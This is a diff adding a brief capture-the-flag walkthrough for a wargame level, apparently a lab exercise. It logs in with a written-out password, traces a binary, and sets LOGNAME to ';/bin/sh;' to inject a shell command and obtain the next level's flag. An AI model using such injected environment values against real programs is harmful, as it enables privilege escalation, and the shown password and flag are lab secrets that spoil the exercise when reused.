@@ -1,0 +1,10 @@
+ssh level07@192.168.1.34 -p 4242
+wiok45aaoguiboiki2tuin6ub
+ls -la
+#We found a binary named level07, let's try ltrace
+ltrace ./level07
+#the binary seems to get the env variable named "LOGNAME", maybe we can exploit it
+LOGNAME=";/bin/sh;"
+./level07
+#getting access to the shell of the creator of the binary
+getflag ---> fiumuikeil55xe9cu4dood66h
